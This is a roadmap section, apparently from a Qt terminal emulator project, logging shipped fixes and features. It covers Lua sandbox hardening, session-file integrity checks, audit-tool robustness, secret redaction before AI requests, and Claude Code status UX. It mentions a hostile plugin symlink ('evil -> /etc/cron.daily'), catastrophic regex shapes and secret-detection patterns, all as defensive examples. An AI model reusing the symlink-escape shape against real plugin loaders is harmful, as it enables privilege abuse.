- ✅ **BCE on scroll + erase paths.** Shipped 0.7.23. `clearRow`
  already had the `m_currentAttrs.bg.isValid()` fallback, but
  `takeBlankedCellsRow()` hardcoded `m_defaultBg` (used by IL/DL/SU/SD
  and the LF-past-scroll-bottom auto-scroll) and `deleteChars` /
  `insertBlanks` used bare `m_currentAttrs.bg` with no valid guard.
  Consolidated into a single `eraseBg()` helper on TerminalGrid.
  Regression test `tests/features/bce_scroll_erase` locks 10
  behavioral subcases. Pre-fix source fails 5; post-fix all 10 pass.
- ✅ **Wide-char overwrite zeroes the mate.** Shipped 0.7.24. Both
  `handlePrint` (narrow + wide branches) and the SIMD fast path
  `handleAsciiPrintRun` now route their writes through a single
  `breakWidePairsAround(row, startCol, endCol)` helper that runs
  BEFORE the write: it blanks a stranded `isWideChar` mate on the
  left edge (when the write lands on an `isWideCont`) and clears a
  stranded `isWideCont` on the right edge (when the write clobbers
  the first half whose continuation lives one past the region).
  Regression test `tests/features/wide_char_overwrite_mate` locks 5
  subcases (narrow-over-right, narrow-over-left, wide-over-wide-
  shifted, ASCII-fast-path, non-overlap-preservation). Pre-fix
  source fails 4 subcases; post-fix all 5 pass.
- ✅ **`background_alpha` — dropped as redundant.** Shipped in
  [Unreleased]. User confirmed (2026-04-24) they use `opacity`
  ~0.9-0.95 to make the terminal area translucent while chrome
  stays solid — exactly what the `opacity` config key already
  does (paint site at `terminalwidget.cpp:605` applies per-pixel
  alpha via `m_windowOpacity`). Since `background_alpha` had no
  UI widget, no paint-site consumer, and overlapped intent with
  `opacity`, removed the config getter/setter, the
  `TerminalWidget::setBackgroundAlpha` method, and the
  `m_backgroundAlpha` member entirely. Stale key in existing
  `config.json` files is harmlessly ignored on load. README
  example + defaults table pruned in the same commit.
- ✅ **`terminal_partial_update_mode` spec rewrite.** Shipped in
  [Unreleased]. The `.cpp` test already enforced the correct
  post-0.7.4 invariant (TerminalWidget is a plain `QWidget`,
  `QOpenGLWidget::` call-shape absent, `makeCurrent()` calls absent);
  only the adjacent `spec.md` still documented the pre-0.7.4
  PartialUpdate fix. Spec rewritten to match the test: problem
  description preserved, "Fix" section now explains the full base-
  class switch (not setUpdateBehavior), Invariants list mirrors the
  4 INVs the test actually enforces, History section covers the
  PartialUpdate detour that didn't fix it. Directory name kept for
  CMake stability.
- ✅ **Lua: strip `string.dump`, pass `"t"` mode to `luaL_loadfilex`.**
  Shipped 0.7.21. `sandboxEnvironment()` now removes `string.dump`
  via `lua_setfield(m_state, -2, "dump")` scoped to the already-
  loaded string table (the `dangerous[]` global-nil loop misses
  table members by construction). `loadScript` replaces
  `luaL_dofile` with `luaL_loadfilex(..., "t") + lua_pcall`,
  adding a second rejection gate at the Lua loader level for
  bytecode chunks (the first gate is the 0x1b-first-byte peek,
  already in place). Locked by `lua_sandbox_hardening` I1 + I4.
- ✅ **Lua: cap manifest size + canonical plugin path.** Shipped
  0.7.33. `PluginManager::scanAndLoad` now reads at most 1 MiB of
  `manifest.json` via `f.read(kMaxManifestBytes)` (was unbounded
  `f.readAll()` — a multi-GB manifest would OOM-kill the process
  before QJsonDocument could reject it). Plugin scan anchors on
  `QFileInfo(m_pluginDir).canonicalFilePath()` and passes
  `QDir::NoSymLinks` to `entryList`; per-entry it computes the
  canonical path of each candidate plugin dir and rejects any
  whose canonicalized path doesn't equal the canonical root or
  start with `canonicalRoot + "/"`. Closes the symlink-escape
  shape where a hostile plugin tarball's `evil -> /etc/cron.daily`
  could redirect the loader. Locked by
  `tests/features/plugin_manifest_safety/` — 12 invariants on the
  cap, NoSymLinks, canonical anchor, per-entry containment.
- ✅ **Lua: clear hook before `lua_close` in `shutdown()`.** Shipped
  0.7.21. `LuaEngine::shutdown` calls `lua_sethook(m_state,
  nullptr, 0, 0)` before `lua_close(m_state)` — closes the UAF
  window where `__gc` metamethods running during destruction
  could observe a partially-finalized engine via the count hook's
  registry lookup of `__ants_engine`. Locked by
  `lua_sandbox_hardening` I5.
- ✅ **Lua: reconcile resource-limit docs.** Shipped 0.7.18
  (PLUGINS.md rewrite). Previously documented as "per plugin per
  event invocation" with each event getting a fresh 10M-instruction
  budget; the implementation sets `lua_sethook(LUA_MASKCOUNT,
  10000000)` once at engine init and the counter accumulates across
  all handlers in the same VM until the hook fires. PLUGINS.md now
  describes the real per-VM-cumulative contract.
- ✅ **Session file: SHA-256 payload checksum.** Shipped 0.7.30.
  `SessionManager::serialize` now wraps the qCompress output in a V4
  envelope `[SHEC magic 0x53484543][envelope version=1][SHA-256 of
  payload (32 bytes)][payload length (uint32)][compressed payload]`;
  `restore` peeks the magic, verifies the hash, and refuses to restore
  on version mismatch, length disagreement, or hash mismatch. Inner
  `QDataStream` format unchanged (still V3) — the integrity layer is
  framing-only. Legacy V1-V3 files continue to load via the magic-peek
  fall-through; their next save writes them out as V4 organically.
  Bundled with the qUncompress pre-flight + cell-loop status checks
  below as the 0.7.30 "Session-file integrity" release. Regression
  test `tests/features/session_sha256_checksum` (4 invariants).
- ✅ **Session file: pre-validate compressed length prefix before
  `qUncompress`.** Shipped 0.7.30. `restore` reads the first 4 bytes
  of the compressed payload, reconstructs the big-endian uint32, and
  rejects any claim above `MAX_UNCOMPRESSED` (500 MB) BEFORE
  `qUncompress` runs — constant-time, no allocator pressure. Short-
  payload guard (`compressed.size() < 4`) keeps the same path safe
  against truncated inputs that can't carry a length prefix. The
  post-decompression cap remains as a defense-in-depth backstop.
  Regression test `tests/features/session_qcompress_length_guard`
  (4 invariants).
- ✅ **Session file: `QDataStream::status()` checks inside cell loop.**
  Shipped 0.7.30. `readCell` now returns `bool` and short-circuits on
  `in.status() != QDataStream::Ok`; every call site (scrollback cells,
  screen cells in range, screen cells skipped on width or height
  shrink) is guarded by `if (!readCell(...)) return false`. The
  combining-character helper checks status after each codepoint read,
  so a stream truncated mid-codepoint can't push default-constructed
  `0` into the combining map either. Pre-fix, a partial save (kernel
  crash mid-fsync, disk-full mid-write, hostile sender truncating the
  envelope payload) could materialize as garbage cells in the next
  restore — not a crash, but a corrupted scrollback. Regression test
  `tests/features/session_cell_loop_stream_status` (3 invariants).
- ✅ **Portal session close.** Shipped 0.7.33.
  `GlobalShortcutsPortal` now has a destructor that issues an
  asynchronous `org.freedesktop.portal.Session.Close` call
  against `m_sessionHandle` (when non-empty) before the QObject
  unwinds. New `kSessionIface` constant alongside the existing
  service/path/interface constants in the anonymous namespace.
  Pre-fix `xdg-desktop-portal` accumulated one orphan session
  per Ants invocation that crashed / was SIGKILLed, released
  only when the portal service itself restarted. Locked by
  `tests/features/portal_session_close/` — 8 invariants on
  header dtor declaration, kSessionIface constant, empty-handle
  early return, and the asyncCall(createMethodCall(...,
  "Close", ...)) dispatch.
- ✅ **Cached dialog + stale-widget-state on external config reload.**
  Shipped 0.7.20. `MainWindow::onConfigFileChanged` now closes the
  cached `m_settingsDialog` (if visible), schedules it via
  `deleteLater()`, and nulls the pointer before re-applying settings,
  so the next Preferences... open rebuilds the dialog from the
  freshly reloaded `m_config`. Pre-fix the address of `m_config` was
  stable (value member) so the Config pointer wasn't strictly
  dangling, but the dialog's widgets were populated at construction
  time and held pre-reload values — a subsequent Save would silently
  overwrite the external edit. Regression test:
  `tests/features/settings_dialog_config_reload/` — 4 source-grep
  invariants scoped to the function body (cache nulled,
  visible-then-close gate, deleteLater not raw delete, invalidation
  exclusive to `onConfigFileChanged`).
- ✅ **`WA_OpaquePaintEvent` on `m_menuBar`.** Shipped in [Unreleased].
  `MainWindow` ctor now calls
  `m_menuBar->setAttribute(Qt::WA_OpaquePaintEvent, true)` — stops Qt
  from invalidating the translucent parent's compositor region under
  the menubar when it repaints. Closes the mouse-move-over-menubar
  dropdown flicker on KWin that the 0.7.4 QOpenGLWidget→QWidget
  refactor didn't fully eliminate. `menubar_hover_stylesheet` test
  INV-3b reinstated (was previously marked "moved to terminal_partial_update_mode"
  but that test covers an orthogonal fix; both now assert their own
  attribute).
- ✅ **SARIF emit suppressed findings with `suppressions[]` array.**
  Shipped 0.7.29. Parse pipeline marks suppressed findings via
  `Finding::suppressed = true` instead of dropping them; render paths
  (UI, HTML, plain-text) keep filtering via `isSuppressed`; SARIF
  export iterates ALL findings and attaches a `suppressions[]` block
  (`kind: "external"`, `state: "accepted"`, `justification`: user's
  reason from `~/.audit_suppress` JSONL). Reasons surfaced via a new
  `m_suppressionReasons: QHash<QString,QString>` map populated by
  `loadSuppressions` and mirrored by `saveSuppression`. Locked by
  `tests/features/audit_sarif_suppressions` (5 invariants).
- ✅ **Audit: per-tool timeout override.** Shipped 0.7.28. New
  `int timeoutMs = 30000;` trailing field on the `AuditCheck`
  aggregate; `runNextCheck` reads `check.timeoutMs` instead of the
  hard-coded global. Calibration loop at the end of `populateChecks`
  bumps known-slow tool IDs to 60 s (`cppcheck`, `cppcheck_unused`,
  `clang_tidy`, `clazy`), 90 s (`semgrep`), or 120 s
  (`osv_scanner`, `trufflehog`). Timeout-handler warning string is
  now formatted from the actual cap. Locked by
  `tests/features/audit_per_tool_timeout` (4 invariants).
- ✅ **Audit: incremental QProcess output drain.** Shipped 0.7.28.
  Constructor connects `readyReadStandardOutput` /
  `readyReadStandardError` to new `onCheckOutputReady` /
  `onCheckErrorReady` slots that append to `m_currentOutput` /
  `m_currentError` incrementally. On overflow
  (`MAX_TOOL_OUTPUT_BYTES = 64 * 1024 * 1024`), the process is killed
  and `m_outputOverflowed` is flagged so `onCheckFinished` surfaces
  a distinct "Output exceeded N MiB cap" warning. Buffers reset
  before each check via `runNextCheck`. New `connectProcessSignals`
  helper centralises the finished + drain connections so the
  kill / reconnect cycles never lose a slot. Pragmatically chose
  in-memory bounded buffer over the temp-file approach — temp
  files complicate cleanup and overflow itself indicates a broken
  tool worth surfacing rather than hiding. Locked by
  `tests/features/audit_incremental_output_drain` (6 invariants).
- ✅ **Audit: regex-DoS watchdog on user `drop_if_matches` /
  `.audit_allowlist.json`.** Shipped 0.7.29. Two-layer defense:
  static `isCatastrophicRegex` heuristic rejects nested-quantifier
  shapes (`(.+)+`, `(\w*)*`, `(.*)+`) at compile time with a qWarning
  naming the offending pattern; surviving patterns are wrapped in
  PCRE2's `(*LIMIT_MATCH=100000)` inline option via `hardenUserRegex`
  so even shapes that slip past the heuristic have a bounded
  match-step budget — PCRE2 returns "no match" on overrun
  (fail-safe). 100k steps handles every sane pattern (typical match
  completes in < 1k) and aborts adversarial patterns within
  milliseconds. Skipped the QtConcurrent + thread-watchdog approach
  in favour of PCRE2's built-in step counter; cheaper and
  deterministic. Locked by `tests/features/audit_regex_dos_watchdog`
  (4 invariants).
- ✅ **Audit: widen `computeDedup` to 96 bits (24 hex chars).**
  Shipped 0.7.29. `.left(16)` → `.left(24)` raises the birthday
  collision threshold from ~2^32 to ~2^48 for 8 extra bytes per
  stored key — well past any plausible project's lifetime
  collection. New `bool AuditDialog::isSuppressed(const QString
  &dedupKey) const` helper encapsulates a backward-compat lookup:
  match either the full 24-char key OR the leading 16-char prefix,
  so existing pre-0.7.29 user `~/.audit_suppress` entries continue
  to suppress new 24-char findings without forcing a migration. Six
  render-pipeline call sites that previously read
  `m_suppressedKeys.contains(f.dedupKey)` now route through the
  helper. Locked by `tests/features/audit_dedup_96bit`
  (4 invariants).
- ✅ **Audit: distinguish "tool exited non-zero with empty stdout"
  from "tool reported no findings".** Shipped 0.7.28.
  `onCheckFinished`'s parameters are now named (`exitCode`,
  `exitStatus`) and the function branches on `QProcess::CrashExit`
  to emit a "Tool crashed (signal exit)" warning, on
  `exitCode != 0 && stdout empty && stderr non-empty` to emit a
  "Tool exited N with no findings on stdout" warning. Both warnings
  demoted to `Severity::Info`. The four exit modes (timeout,
  overflow, crash, non-zero-with-stderr-only) funnel through a
  single `makeToolHealthWarning()` helper that centralises the row
  shape. Locked by `tests/features/audit_tool_crash_distinct`
  (4 invariants).
- ✅ **Concurrent-writer guard on `config.json` + `settings.local.json`.**
  Shipped 0.7.31. Both writers now go through the
  `WithFileLock` RAII helper (`secureio.h`), which acquires an
  advisory `flock(LOCK_EX)` on a sibling `.lock` file before the
  atomic write+rename and releases on scope exit. Two ants
  processes (or ants + a side-channel writer) serialise instead of
  racing — last-writer-wins is replaced by last-acquired-lock-wins,
  with the loser blocking ~1 ms and seeing the winner's bytes. Same
  pattern reused in `claudeallowlist.cpp` and `debuglog.cpp` for
  consistency. Locked by `tests/features/concurrent_writer_lock/`
  (4 invariants over the lock-file path, the
  `setOwnerOnlyPerms` post-rename re-chmod, the lock RAII, and the
  fcntl LOCK_EX / LOCK_UN ordering).
- ✅ **`debug.log` 0600 perms.** Shipped 0.7.20. `DebugLog::setActive`
  now calls `setOwnerOnlyPerms` on both the opened `QFileDevice` and
  the path string immediately after open, before the session header
  is written. The fd-level call covers the just-opened descriptor;
  the path-level call narrows any pre-existing 0644 file that append
  reused from a prior (pre-fix) run. Fix uses the project-standard
  `secureio.h` helper, matching every other persistence site in the
  project. Regression test: `tests/features/debuglog_perms/` —
  4 invariants (fresh open under umask 0022 → 0600, clear+reopen
  preserves 0600, pre-existing 0644 narrowed, source uses the
  helper).
- ✅ **Claude transcript: 32 KB tail window → scan-for-first-newline +
  grow.** Shipped 0.7.14. Replaced the fixed 32 KB window +
  firstLine-skip with a doubling-grow loop (32 KB → 4 MiB cap) that
  trims the potentially-partial prefix line only when the buffer
  contains ≥ 2 newlines, guaranteeing real content remains for the
  parser.
- ✅ **Claude transcript: handle `thinking` content blocks.** Shipped
  0.7.14. `ClaudeTranscriptDialog::formatEntry` now renders `thinking`
  blocks as italicized, dimmed paragraphs so readers can tell them
  apart from the visible reply.
- ✅ **`decodeProjectPath` preserves hyphens.** Shipped 0.7.14.
  Rewrote as a greedy filesystem-probing walker: at each hyphen,
  prefer `/` if that directory exists, fall back to `-` if that
  exists instead, default to `/` otherwise. Preferred source of
  truth is still `extractCwdFromTranscript`; the new decoder is the
  last-resort fallback.

### 🔁 Follow-ups from the re-review checkpoint (2026-04-23)

The 8-agent re-review of the Tier 1 batch surfaced a second wave of
findings. The HIGH ones landed in the same commit (missed settings-
dialog site, SSH `Match exec` / `KnownHostsCommand`, AI bidi /
C1 / NEL / LS-PS stripping + preview-length parity). These are the
remainder, captured so they don't drop on the floor.

- ✅ **Config backup retention cap.** Shipped 0.7.12 (code) +
  0.7.15 (regression test). `rotateCorruptFileAside` prunes siblings
  beyond the newest 5; ranks on mtime, not filename timestamp.
  `config_parse_failure_guard` INV-5 plants 8 stale backups and
  confirms post-prune count.
- ✅ **Remote-control: cache gate decision at process start.** Shipped
  0.7.12. `mainwindow.cpp:799` uses `static const bool
  remoteControlGate = m_config.remoteControlEnabled()` so a second
  MainWindow doesn't re-read the flag.
- ✅ **Remote-control: behavioral gate test.** Shipped 0.7.15. Config
  round-trip assertion replaces the 0.7.12 grep-for-getter-name
  approach (a rename would have silently defeated the grep).
  Structural "start() lives inside a conditional" check retained
  as plain-substring lookback.
- ✅ **Remote-control: `filterControlChars` header comment.** Already
  accurate in `remotecontrol.h:70-79` — "Strip C0 control bytes"
  with explicit rationale for why C1 is the AI-dialog layer's job
  (C1 bytes are UTF-8 continuation, structurally can't be stripped
  at byte level).
- ✅ **Audit rule-pack trust: project-scoped store.** Shipped 0.7.13.
  Replaced the global `audit_trust_command_rules` bool with a
  `{canonical project_path → sha256(audit_rules.json)}` store
  (`Config::isAuditRulePackTrusted` / `trustAuditRulePack` /
  `untrustAuditRulePack`). Trusting one project no longer extends to
  siblings; any rule-pack edit invalidates trust.
- ✅ **Audit rule-pack trust: in-dialog UI surface.** Shipped 0.7.13.
  Skipped-rule count appears on the Detected-types row as an
  "Untrusted rules: N" badge with a tooltip explaining the opt-in
  path. Stderr `qWarning` retained for headless / CI invocations.
- ✅ **Audit rule-pack trust: regression test.** Shipped 0.7.13.
  `tests/features/audit_command_rule_trust/` locks seven invariants:
  default-untrusted, round-trip, hash-invalidation, project-scoping,
  symlink+trailing-slash canonicalization, idempotent untrust, and
  cross-instance persistence.
- ✅ **`/tmp/kwin_*.js` orphan cleanup.** Shipped 0.7.15.
  `MainWindow` ctor runs `sweepKwinScriptOrphansOnce()` — a
  once-per-process scan of `kwin_{pos,move,center}_ants_*.js` with
  an mtime older than 1 hour. Guarded by a `static bool` so a
  second MainWindow (File → New Window) doesn't re-sweep.
- ✅ **Plugin-manager `manifest.json` + themes `*.json` parse warnings.**
  Already implemented. `pluginmanager.cpp:146` + `themes.cpp:308`
  both emit `qWarning` with error string + byte offset when
  `QJsonDocument::fromJson` fails.
- ✅ **AI `sendRequest` context redaction (OWASP LLM06).** Shipped in
  [Unreleased]. New header-only module `src/secretredact.h` exposes
  `SecretRedact::scrub(QString) → {text, redactedCount}` with a
  14-shape priority-ordered regex set (AWS AKIA/ASIA; GitHub classic
  / OAuth / app / fine-grained PATs; Anthropic, OpenAI project + legacy;
  Slack, Stripe, JWT; `Bearer <token>`; generic
  `api_key=`/`token=`/`password=`/`secret=` assignments; multi-line
  PEM private-key blocks). `AiDialog::sendRequest` now scrubs both
  `m_terminalContext` and `userMessage` before either reaches the
  JSON body; the chat history's "You:" display keeps the
  pre-redaction text (redaction is a network-boundary concern, not a
  UX one). When `redactedCount > 0` the dialog appends a System note
  so the user knows the payload differs from what they saw/typed.
  Contract pinned by `tests/features/ai_context_redaction/spec.md`
  + 16-positive + 6-negative + source-grep feature test. Verified to
  fail against pre-fix source (5 grep invariants fail as expected)
  before locking.
- ✅ **AI `extractAndSanitizeCommand` language-hint heuristic.** Shipped
  0.7.12 (same commit as the Tier 1 AI sanitize work). The gate was
  tightened to `nl > 0 && nl < 10 && !first.contains(' ') &&
  !first.contains('\t')` in `aidialog.cpp` — language IDs are single
  unbroken tokens, so a short first line containing whitespace is a
  real command (e.g. `foo bar`) and must not be eaten. Locked by
  `tests/features/ai_insert_command_sanitize/test_ai_insert_command.cpp`
  at the "short first line with space is NOT a lang hint" and "short
  first line with tab is NOT a lang hint" cases. Roadmap bullet was
  stale; marking now.
- ✅ **Allowlist + settings-dialog feature-test analogs.** Shipped
  0.7.31 via `tests/features/settings_parse_failure_mirror/` (8
  invariants: rotation call site, return-false-after-rotation
  gating, open-failure branch distinct from parse-failure branch,
  comment anchors). Closes the test-coverage hole — the code was
  already correct (0.7.12), but only Config had behavioural test
  coverage.
- ✅ **Spec.md timestamp format drift.** Spec already uses
  `<ms_timestamp>` (line 51), matching the code. Roadmap bullet
  was stale.
- ✅ **`secureio.h` split.** Shipped 0.7.31. `secureio.h` is now
  perms-only (`setOwnerOnlyPerms` overloads). `configbackup.h` owns
  `rotateCorruptFileAside` (silent-data-loss recovery, was 0.7.12)
  + the new `ConfigWriteLock` (cooperative POSIX flock(2) RAII guard,
  added this release). Split happened *before* the third helper
  landed — the trigger was wanting to add ConfigWriteLock, which
  is even less about perms than rotation. Locked by
  `tests/features/secureio_configbackup_split/` — 13 invariants
  on file-content boundaries, non-copyable lock, and downstream
  caller include sets.
- ✅ **Plan-mode regression-test tightening.** Shipped 0.7.15.
  `runToggleFreeTailPreservesState` now attaches a
  `QSignalSpy(&ci, &ClaudeIntegration::planModeChanged)` and asserts
  exactly one emission across both parse phases (seed triggers
  NotSet → plan; tail phase has zero permission-mode events and
  must not re-fire).

### 🎨 Claude Code UX — per-tab status indicator (user request 2026-04-23)

- ✅ **Per-tab Claude-Code activity indicator.** Shipped in
  [Unreleased]. New `ClaudeTabTracker` class (`src/claudetabtracker.
  {h,cpp}`) keys per-shell state by PID (not tab index — stable under
  reorder), shares the transcript-tail parser with the singleton
  `ClaudeIntegration` via a new static `parseTranscriptTail` helper
  (no code duplication). `ColoredTabBar::paintEvent` gained a second
  pass that calls an `IndicatorProvider` callback to render an 8 px
  dot at the leading edge of each tab — muted grey for Idle /
  Thinking, blue for ToolUse, green for Bash (distinct from generic
  ToolUse because it's the longest-running, highest-signal tool),
  cyan for Planning, violet for Compacting, bright orange with a
  white outline for AwaitingInput. Permission prompts route by the
  hook event's `session_id` (matched against the transcript
  filename's UUID basename) so a prompt emitted by Claude in tab 3
  lights up **tab 3's** glyph, not the currently-focused tab;
  scroll-scan detection carries the owning terminal pointer directly
  so it routes without session-id. Permission-prompt resolution
  (Allow / Deny / Add-to-allowlist), terminal scanner retraction,
  toolFinished, and sessionStopped all clear the flag. Tab hover
  tooltip shows "Claude: thinking…" / "Claude: Bash" / etc. so the
  user can disambiguate glyphs without switching tabs. Settings
  dialog (General tab) checkbox flips `claude_tab_status_indicator`
  (default on); change takes effect on next paint via the live
  config reload path without app restart. Contract locked by
  `tests/features/claude_tab_status_indicator/spec.md` + 11-invariant
  feature test. Stage 1 scope complete.

### 🎨 Claude Code UX — token-saving git-context hook (user request 2026-04-24)

- ✅ **UserPromptSubmit git-context hook.** Shipped in [Unreleased].
  New Settings button "Install git-context hook" writes
  `~/.config/ants-terminal/hooks/claude-git-context.sh` + merges a
  `hooks.UserPromptSubmit` entry into `~/.claude/settings.json` so
  every Claude Code prompt carries a compact `<git-context>` block
  (branch, upstream, ahead/behind, staged/unstaged/untracked
  counts). Claude sees repo state without running `git status` via
  Bash — saves ~400–600 tokens per turn where the model would have
  otherwise queried. Global (user's explicit ask: "Can this hook be
  available to all projects?") because `~/.claude/settings.json` is
  user-scope; hook no-ops outside git repos / when `git` isn't on
  PATH, so non-repo sessions see no behaviour change. Independent
  of the existing status-bar hook installer (different data flow:
  Claude→git vs Ants→Claude). Pinned by
  `tests/features/claude_git_context_hook/spec.md` — 10 installer
  source-grep invariants (idempotency, UserPromptSubmit targeting,
  parse-error-refuse, user-hook preservation, global-scope only,
  dedicated button wiring) + 5 behavioral script invariants
  (not-a-repo no-op, git-missing no-op, clean repo, dirty repo
  counts, `CLAUDE_PROJECT_DIR` override).

### 🎨 Claude Code UX — manual tab rename stomped (user request 2026-04-24)

- ✅ **Right-click "Rename Tab…" pins the label.** Shipped in
  [Unreleased]. The rename handler at `mainwindow.cpp:4284` wrote
  directly to `m_tabWidget->setTabText` without populating
  `m_tabTitlePins`; the `titleChanged` signal handler and the 2 s
  `updateTabTitles` tick both consult the pin map, so Claude Code's
  per-prompt OSC 0/2 title writes wiped the manual name within
  seconds. Rename now routes through `setTabTitleForRemote` (the
  rc_protocol `set-title` path) — non-empty names pin, empty names
  clear the pin and restore the format-driven / shell-driven label,
  giving the user an in-UI "un-rename" path that didn't exist
  before. Low-risk one-handler change; confirmed it fails cleanly
  against pre-fix source before locking. Locked by
  `tests/features/tab_rename_pin` (4 invariants: lambda calls
  `setTabTitleForRemote(…)`, no direct `setTabText`, empty-name
  path not guarded out, consumer-side `m_tabTitlePins.contains(…)`
  guards still present on both consumers).

### 🎨 Claude Code UX — background-tasks status-bar surface (user request 2026-04-25)

- ✅ **Claude Code background-tasks button.** Shipped 0.7.38. User
  ask: "a button on the status bar when there are background tasks
  being run. We then click the button to view what Claude Code
  shows for the background tasks. The button opens a dialog showing
  the live update info on the background tasks." New
  `ClaudeBgTaskTracker` (`claudebgtasks.{h,cpp}`) parses the active
  session's transcript JSONL for `tool_use` blocks whose
  `input.run_in_background == true` and correlates them with
  `tool_result` blocks carrying `toolUseResult.backgroundTaskId`
  (which embeds the on-disk
  `/tmp/claude-$UID/.../<id>.output` path). Completion / kill state
  is derived from subsequent `BashOutput` results carrying
  `status: "completed" | "killed" | "failed"` and from `KillShell`
  tool calls. `MainWindow` adds a sibling-of-Review-Changes
  `m_claudeBgTasksBtn`, hidden when `runningCount() == 0`,
  re-targeted on tab switch via `refreshStatusBarForActiveTab` so
  each tab's session drives its own count independently.
  `ClaudeBgTasksDialog` (`claudebgtasksdialog.{h,cpp}`) is the
  live-tail dialog, mirroring the 0.7.37 Review Changes update
  model — `QFileSystemWatcher` on each task's `.output` plus the
  transcript, 200 ms debounce, skip-identical-HTML guard,
  capture-vbar-before-`setHtml` + restore-after with `qMin(...,
  maximum())` clamp, and a "was-at-bottom" pin so live appends
  stay visible. Locked by
  `tests/features/claude_bg_tasks_button/` (10 invariants —
  source-grep harness, no Qt link).

- ✅ **Background-tasks button scopes to the active tab's project.**
  Shipped 0.7.44. User feedback 2026-04-27: "For the background
  tasks dialog, please ensure that it only references the
  background tasks for that project, not all projects." Previously
  `ClaudeIntegration::activeSessionPath()` walked
  `~/.claude/projects/` system-wide and returned the most-recently-
  modified `.jsonl`, which meant a busy session in one project's
  window would surface its bg-tasks count on a sibling window
  pointed at a different project. The method now accepts a
  `projectCwd` argument; the active tab's `shellCwd()` is encoded
  via `encodeProjectPath` and the helper walks up the cwd
  (`cdUp`) probing each ancestor's `~/.claude/projects/<encoded>/`
  subdir, returning the deepest match's newest `.jsonl`. Empty
  `projectCwd` falls back to the system-wide newest (kept for
  callers that genuinely want it; nothing in tree currently does).
  Locked by `tests/features/claude_bg_tasks_button/` extended from
  10 → 11 invariants — INV-11 source-greps the header signature,
  the implementation walk-up logic (`encodeProjectPath` + `cdUp`),
  and the call-site wiring through
  `focusedTerminal()->shellCwd()`.

### 🎨 Claude Code UX — unified state-dot palette (user request 2026-04-27)

- ✅ **Single round dot per tab, colour-only differentiation, palette
  extended to status bar.** Shipped 0.7.39. User ask: "a round dot
  on each tab that has a Claude Code session running (no icons or
  anything else other than the tab label). The dot will change
  colour with the various states that Claude Code is in. Each state
  has its own colour (grey for idle). Then extend those colours to
  the status bar Claude Code status too." New static helper
  `ClaudeTabIndicator::color(Glyph)` in `coloredtabbar.h` is the
  single source of truth for an eight-state palette: Idle `#888888`
  (grey, per user spec), Thinking `#5BA0E5` (blue), ToolUse
  `#E5C24A` (yellow), Bash `#6FCF50` (green), Planning `#5DCFCF`
  (cyan), Auditing `#C76DC7` (magenta), Compacting `#A87FE0`
  (violet), AwaitingInput `#F08A4B` (orange). Red is intentionally
  absent — AwaitingInput is a normal interaction state, not an
  error. `ColoredTabBar::paintEvent` calls the helper for fill
  colour and now uses a single `kDotRadius = 4` for every state
  (the prior AwaitingInput "radius 5 + white outline" treatment is
  gone — colour alone is the differentiator, per "no icons or
  anything else other than the tab label"). `MainWindow::
  applyClaudeStatusLabel` was rewired to map current state →
  Glyph → colour through the same helper, replacing the prior
  `Theme::ansi[N]` mappings (which made the status-bar colour drift
  from the tab dot's colour and varied across themes). Auditing —
  previously surfaced only on the active-tab status bar — is now
  plumbed into `ClaudeTabTracker::ShellState::auditing` and lights
  the per-tab dot magenta on whichever tab's transcript has
  `/audit` in flight, tooltip "Claude: auditing". Precedence
  unchanged across the two surfaces: AwaitingInput → Planning →
  Auditing → state-derived. Locked by
  `tests/features/claude_state_dot_palette/` (8 invariants —
  source-grep harness, no Qt link, asserts helper signature, full
  palette, paintEvent helper-call, uniform geometry, mainwindow
  wiring, auditing plumbing).

### 🎨 Status-bar Roadmap viewer (user request 2026-04-27)

- ✅ **Status-bar Roadmap button + filterable live-tail dialog.**
  Shipped 0.7.39. User ask: "a button on the status bar to view the
  roadmap. So, it brings up a dialog showing the roadmap. It should
  have filters as well to show what is outstanding and what is
  completed if the user wants to use the filters. If at all
  possible, it should also highlight what item is being done
  currently." Follow-up: "the roadmap button should only show if
  there is roadmap documentation. Let's simplify that to requiring
  a roadmap.md file only. The user should follow norms for the
  roadmap button to show." Plus a clarification adding a fourth
  emoji toggle and elevating "Currently being tackled" to a
  peer filter. New `RoadmapDialog` (`roadmapdialog.{h,cpp}`)
  parses ROADMAP.md line-by-line into themed HTML with 5 peer
  category checkboxes (✅ Done · 📋 Planned · 🚧 In progress ·
  💭 Considered · Currently being tackled). All default-checked;
  combined inclusively (a bullet renders iff ANY enabled category
  matches). Plain narration bullets without status emojis always
  render. The "Currently being tackled" signal set is built from
  `CHANGELOG.md` `[Unreleased]` block + the last 5
  non-release/merge/revert git commit subjects, fuzzy-matched
  (lowercase, hyphens-as-spaces, punctuation-stripped) against
  bullet payloads. Matched bullets get a yellow left-border CSS
  highlight (`border-left: 4px solid #E5C24A` — the new ToolUse
  yellow from the dot palette, intentionally consistent across the
  two surfaces). Live updates: `QFileSystemWatcher` on
  ROADMAP.md + CHANGELOG.md, 200 ms debounce, the same
  scroll-preservation triple shipped with 0.7.37 / 0.7.38
  (capture vbar before `setHtml`, restore with `qMin(saved,
  maximum())` clamp, was-at-bottom pin). Button visibility is
  per-tab: `MainWindow::refreshRoadmapButton` (called from the
  central `refreshStatusBarForActiveTab` tick) probes the active
  tab's `shellCwd()` for any case-variant of `ROADMAP.md` and
  shows/hides accordingly — terminals running outside any project
  root pay nothing. Locked by `tests/features/roadmap_viewer/`
  (10 invariants — links the dialog source so the static
  `renderHtml` helper can be driven against synthetic markdown,
  asserts five-bit filter semantics, the highlight CSS marker on
  signal match, the marker's absence on empty signal sets, the
  case-insensitive cwd probe, and the wire-up shape).

- ✅ **Roadmap viewer polish — Close button fix + dynamic TOC sidebar.**
  Shipped 0.7.43. User feedback 2026-04-27: "I love the roadmap
  button / dialog. The 'X Close' button does nothing when clicked
  though. Also, I would like a navigation bar added to jump to
  various sections of the readme. This needs to be dynamic across
  projects please." Two fixes in one bundle: (1) the standard
  `QDialogButtonBox::Close` button under some Qt 6 builds doesn't
  emit `rejected()` reliably — wire `clicked` directly on the
  underlying `QPushButton` retrieved with
  `button(QDialogButtonBox::Close)`, keeping `rejected()` as a
  belt-and-braces fallback; (2) add a `QSplitter(Qt::Horizontal)`
  with a left-side `QListWidget` (`objectName "roadmap-toc"`)
  rebuilt from the markdown's `# `..`#### ` headings on every
  refresh — entries are flat, indented two spaces per level above 1,
  level-1 bold; click/activate → `m_viewer->scrollToAnchor(anchor)`.
  `RoadmapDialog::renderHtml` now prepends
  `<a name="roadmap-toc-N">` before each heading; the matching
  `extractToc(markdown)` pure helper returns
  `QVector<{level, text, anchor}>` so both walks share an index.
